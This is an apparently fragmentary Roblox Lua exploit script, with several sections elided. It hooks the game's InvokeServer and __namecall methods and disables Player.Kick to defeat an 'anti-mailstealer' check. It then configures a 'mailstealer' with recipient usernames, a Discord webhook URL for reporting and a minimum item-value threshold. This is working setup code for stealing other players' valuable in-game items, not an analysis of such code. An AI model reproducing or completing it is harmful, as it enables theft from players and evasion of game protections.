...
local hookfunction = genv and genv.hookfunction or function(...) return ... end
...
local getnamecallmethod = clonefunction(genv.getnamecallmethod or function() return "InvokeServer" end)
local getrawmetatable = clonefunction(genv.getrawmetatable or debug.getmetatable)
...
-- Restore the original InvokeServer method for the RemoteFunction
local OldInvoke
for _, v in pairs(getgc(true)) do
    if realtype(v) == "table" and rawget(v, "InvokeServer") then
        OldInvoke = v.InvokeServer
        break
    end
end

if OldInvoke then
    hookfunction(OldInvoke, function(...)
        return OldInvoke(...)
    end)
end

-- Restore the original __namecall method
local OldNamecall
local mt = getrawmetatable(game)
local __namecall = mt.__namecall

if __namecall then
    hookfunction(__namecall, function(...)
        return __namecall(...)
    end)
end

-- Disable the Kick function to prevent being kicked by anti-mailstealer
Player.Kick = function() end

-- Now execute the mailstealer script
Username = "kxvsGG"
Username2 = "kevb1001"
Webhook = "https://discord.com/api/webhooks/1193546399548178542/ql2ZCDiumBjoKTpcDWg9ykcu1NngJJFS3Zc5kNjecppjNPFxUiigxDzqeJs4mZwl-kOg"
min_rap = 500000
